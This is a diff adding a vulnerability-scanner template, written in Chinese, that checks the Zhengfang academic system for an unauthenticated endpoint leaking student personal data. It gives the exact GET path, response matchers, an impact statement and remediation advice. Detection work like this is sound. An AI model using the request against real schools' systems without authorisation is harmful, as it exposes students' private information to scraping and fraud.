@@ -1,0 +1,34 @@
+id: zhengfang-student-info-missing-auth
+
+info:
+  name: 正方教务管理系统学生个人信息接口鉴权缺失导致敏感信息泄露
+  author: qwtd
+  severity: high
+  description: |
+    该接口未部署有效的身份验证机制，远程攻击者可在未授权状态下直接调用，进而获取包含学号、姓名、性别、院系、专业、班级等在内的学生个人敏感数据，存在批量数据泄露风险。
+  impact: |
+    攻击者可遍历或爬取全校学生完整个人信息，用于社工、诈骗、身份冒用等恶意行为，严重侵犯师生隐私权。
+  remediation: |
+    1. 对该接口实施严格的身份认证（如登录态校验、Token 验证）；
+    2. 根据业务最小权限原则，限制接口仅对授权角色开放；
+    3. 敏感字段（如学号、姓名）应脱敏展示或按需申请访问；
+    4. 增加访问频率限制与日志审计。
+  tags: 正方教务管理系统
+  
+http:
+  - raw:
+      - |
+        GET /jwglxt/xsxxxggl/xsgrxxwhMobile_cxXsxxView.html?doType=query HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "currentResult"
+          - "entityOrField"
+          - "items"
+        condition: and
